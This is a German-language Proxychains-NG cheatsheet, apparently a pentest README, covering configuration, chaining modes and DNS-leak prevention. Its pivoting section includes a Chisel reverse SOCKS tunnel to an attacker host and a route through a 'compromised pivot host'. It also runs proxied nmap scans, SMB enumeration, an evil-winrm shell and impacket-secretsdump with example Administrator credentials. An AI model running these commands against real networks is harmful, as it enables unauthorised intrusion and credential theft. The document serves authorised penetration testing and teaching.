<!-- language-home-navigation -->
[🏠 Deutsche Startseite](../../README.de.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md) • [🇮🇹 Italiano](README.it.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# ⛓️ Proxychains – Vollständiger Cheatsheet

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
  ██████╗ ██████╗  ██████╗ ██╗  ██╗██╗   ██╗ ██████╗██╗  ██╗ █████╗ ██╗███╗   ██╗███████╗
  ██╔══██╗██╔══██╗██╔═══██╗╚██╗██╔╝╚██╗ ██╔╝██╔════╝██║  ██║██╔══██╗██║████╗  ██║██╔════╝
  ██████╔╝██████╔╝██║   ██║ ╚███╔╝  ╚████╔╝ ██║     ███████║███████║██║██╔██╗ ██║███████╗
  ██╔═══╝ ██╔══██╗██║   ██║ ██╔██╗   ╚██╔╝  ██║     ██╔══██║██╔══██║██║██║╚██╗██║╚════██║
  ██║     ██║  ██║╚██████╔╝██╔╝ ██╗   ██║   ╚██████╗██║  ██║██║  ██║██║██║ ╚████║███████║
  ╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝    ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝╚══════╝
       Force Any TCP Connection Through SOCKS4, SOCKS5, and HTTP Proxies
```
<p align="center">
  <img src="https://img.shields.io/badge/Proxychains-Proxychains--NG-blue?style=for-the-badge" alt="Proxychains">
  <img src="https://img.shields.io/badge/Category-Pivoting_&_Tunneling-orange?style=for-the-badge" alt="Pivoting & Tunneling">
  <img src="https://img.shields.io/badge/Protocols-SOCKS4_SOCKS5_HTTP-green?style=for-the-badge" alt="Protokolle">
  <img src="https://img.shields.io/badge/License-GPLv2-red?style=for-the-badge" alt="License GPLv2">
</p>

<p align="center">
  <b>🌐 Leiten Sie Standard-Linux-CLI-Netzwerktools dynamisch über Multi-Hop-SOCKS und HTTP-Proxys über LD_PRELOAD weiter</b>
</p>

---

## 📋 Inhaltsverzeichnis

- [Überblick und Funktionsweise von Proxychains](#-overview--how-proxychains-works)
- [Installation](#-Installation)
- [Konfigurationsdateien und Suchhierarchie](#-configuration-files--lookup-hierarchy)
- [Verkettungsmodi erklärt](#-chaining-modes-explained)
  - [`dynamic_chain` (empfohlen)](#dynamic_chain-empfohlen)
  - [`strict_chain`](#strict_chain)
  - [`round_robin_chain`](#round_robin_chain)
  - [`random_chain`](#random_chain)
- [DNS-Leaks-Prävention (`proxy_dns`)](#-dns-leaks-prevention-proxy_dns)
- [Proxy-Listen konfigurieren](#-configuring-proxy-lists)
- [Pivoting-Workflows](#-pivoting-workflows)
  - [SSH Dynamic SOCKS Proxy (`ssh -D`)](#ssh-dynamic-socks-proxy-ssh--d)
  - [Chisel & Ligolo-ng SOCKS Relay](#chisel--ligolo-ng-socks-relay)
- [Tool-Integration und Fallstricke](#-tool-integration--gotchas)
  - [Nmap mit Proxychains (Warum `-sS` fehlschlägt)](#nmap-with-proxychains-why--ss-fails)
  - [Active Directory-Tools (NetExec, Evil-WinRM, Impacket)](#active-directory-tools-netexec-evil-winrm-impacket)
- [Kurzreferenztabelle](#-quick-reference-table)
- [Verteidigungsüberlegungen und OPSEC](#-defensive-considerations--opsec)
- [Rechtlicher Haftungsausschluss](#-legal-disclaimer)

---

## 🎯 Übersicht und Funktionsweise von Proxychains

**Proxychains** (moderner aktiver Fork: **Proxychains-NG** / `proxychains4`) ermöglicht die Ausführung jedes dynamischen Befehls über einzelne oder mehrere verkettete SOCKS4-, SOCKS5- oder HTTP(S)-Proxys.

Es funktioniert durch das Vorladen einer benutzerdefinierten Hook-Bibliothek (`libproxychains4.so`) mithilfe des dynamischen Linker-Mechanismus (`LD_PRELOAD`). Dadurch werden Socket-API-Aufrufe (`connect()`, `gethostbyname()`) von Zielanwendungen abgefangen und deren TCP-Verkehr transparent in die konfigurierte Proxy-Kette umgeleitet.

---

## 📥 Installation
```bash
# Debian / Ubuntu / Kali Linux
sudo apt update && sudo apt install -y proxychains4

# Arch Linux
sudo pacman -S proxychains-ng

# macOS (Homebrew)
brew install proxychains-ng
```
---

## ⚙️ Konfigurationsdateien und Suchhierarchie

Proxychains sucht nach seiner Konfigurationsdatei in der folgenden strengen Prioritätsreihenfolge:

1. Pfad in der Umgebungsvariablen `PROXYCHAINS_CONF_FILE` festgelegt.
2. Datei, die über das `-f`-Flag (`proxychains4 -f ./myproxy.conf <command>`) übergeben wird.
3. `./proxychains.conf` im aktuellen Arbeitsverzeichnis.
4. `$(HOME)/.proxychains/proxychains.conf`.
5. `/etc/proxychains4.conf` (Systemstandard).

---

## 🔗 Verkettungsmodi erklärt

Bearbeiten Sie `/etc/proxychains4.conf`, um den Kettenrouting-Algorithmus auszuwählen:

### `dynamic_chain` (empfohlen)
Überspringt deaktivierte Proxys automatisch in der Liste, ohne die Verbindung abzubrechen. Wenn Proxy Nr. 1 aktiv ist, Proxy Nr. 2 ausgefallen ist und Proxy Nr. 3 aktiv ist, wird der Datenverkehr über 1 -> 3 weitergeleitet.
```ini
dynamic_chain
# strict_chain
```
### `strict_chain`
Befolgt strikt die konfigurierte Proxy-Reihenfolge. Wenn ein Proxy in der Kette ausfällt oder eine Zeitüberschreitung auftritt, wird die gesamte Verbindung abgelehnt.
```ini
strict_chain
```
### `round_robin_chain`
Durchläuft die Proxy-Liste nacheinander bei jeder neuen Verbindungsanforderung.
```ini
round_robin_chain
chain_len = 2
```
### `random_chain`
Wählt zufällig Proxys aus der Liste bis `chain_len` aus.

---

## 🛡️ Verhinderung von DNS-Lecks (`proxy_dns`)

Einer der gefährlichsten OPSEC-Fehler bei externer Aufklärung oder internem Pivoting ist die Weitergabe von DNS-Anfragen an den lokalen ISP oder das Ziel-Gateway.

Stellen Sie sicher, dass `proxy_dns` in `/etc/proxychains4.conf` aktiv ist:
```ini
# Proxy all DNS requests through SOCKS5 proxy
proxy_dns

# Suppress annoying hook library stdout logs
quiet_mode
```
---

## 📝 Proxy-Listen konfigurieren

Unten in `/etc/proxychains4.conf`, unter `[ProxyList]`:
```ini
[ProxyList]
# Protocol   IP               Port   [Username]  [Password]
socks5       127.0.0.1        1080
socks4       192.168.1.100    1080
http         10.10.10.50      8080   admin       SecretPass123
```
---

## 🚀 Pivotierende Arbeitsabläufe

### Dynamischer SSH-SOCKS-Proxy (`ssh -D`)
```bash
# 1. Open background dynamic SOCKS5 proxy on local port 1080 through compromised pivot host
ssh -f -N -D 127.0.0.1:1080 user@10.10.10.50

# 2. Add entry to /etc/proxychains4.conf:
# socks5 127.0.0.1 1080

# 3. Access internal machines unreachable directly from attacker box
proxychains4 curl http://172.16.20.10
```
### Chisel & Ligolo-ng SOCKS Staffel

Beim Ausführen von Chisel-Client-Server-Tunneln:
```bash
# Connect Chisel client with reverse SOCKS
chisel client 10.10.14.5:8000 R:1080:socks

# Route tools through Chisel tunnel
proxychains4 crackmapexec smb 172.16.50.0/24
```
---

## ⚠️ Tool-Integration und Fallstricke

### Nmap mit Proxychains (Warum `-sS` fehlschlägt)

> [!WARNUNG]
> SOCKS-Proxys unterstützen nur etablierte TCP-Sitzungen. **SYN-Stealth-Scans (`-sS`) schlagen fehl oder bleiben hängen**, da sie eine Raw-Socket-Manipulation erfordern, die über SOCKS nicht unterstützt wird!
```bash
# Correct Nmap command with Proxychains (Full TCP Connect, No Ping, No DNS)
proxychains4 nmap -sT -Pn -n -sV -p 80,443,445,3389 172.16.20.10

# Scan Top 100 ports over proxy
proxychains4 nmap -sT -Pn -n --top-ports 100 172.16.20.10
```
### Active Directory-Tools (NetExec, Evil-WinRM, Impacket)
```bash
# SMB enumeration through internal pivot
proxychains4 nxc smb 172.16.20.10 -u Administrator -p 'Password123'

# WinRM shell through proxychains
proxychains4 evil-winrm -i 172.16.20.10 -u Administrator -p 'Password123'

# Impacket secretsdump over SOCKS proxy
proxychains4 impacket-secretsdump domain.local/Administrator:Pass@172.16.20.10 -no-pass
```
---

## ⚡ Kurzreferenztabelle

| Ziel | Befehl |
|-----------|---------|
| **Befehl über Proxy ausführen** | `proxychains4 <command> [args]` |
| **Benutzerdefinierte Konfigurationsdatei** | `proxychains4 -f ./custom.conf <command>` |
| **Quiet Execution (Kein Banner)** | `proxychains4 -q <command>` |
| **Internes TCP-Scan-Ziel** | `proxychains4 nmap -sT -Pn -n -p 80,445 <IP>` |
| **Interne Webanfrage** | `proxychains4 curl -i http://<INTERNAL_IP>` |
| **Interner SQLMap-Test** | `proxychains4 sqlmap -u "http://<IP>/id=1" --batch` |
| **Interne NetExec-Probe** | `proxychains4 nxc smb <SUBNET>/24` |

---

## 🛡️ Defensive Überlegungen und OPSEC

1. **DNS-Lecks:** Wenn `proxy_dns` auskommentiert ist, löst Ihr System Hostnamen über lokales DNS auf und benachrichtigt Blue Teams über gezielte Hostnamen.
2. **Geschwindigkeit und Latenz:** Die Verkettung mehrerer Proxys erhöht die Roundtrip-Zeit (RTT). Legen Sie angemessene Zeitüberschreitungen fest (`tcp_read_time_out 15000`, `tcp_connect_time_out 8000`).
3. **Statische Binärdateien:** Statisch kompilierte Binärdateien (z. B. Go/Rust-Binärdateien, die `libc.so` nicht verknüpfen) umgehen `LD_PRELOAD`-Hooks und werden nicht über Proxychains weitergeleitet.

---

## ⚠️ Rechtlicher Haftungsausschluss

> [!ACHTUNG]
> Dieses Cheatsheet ist nur für autorisierte Penetrationstests, Red-Team-Einsätze und Bildungsforschung gedacht. Eine unbefugte Weiterleitung des Verkehrs ist strengstens untersagt.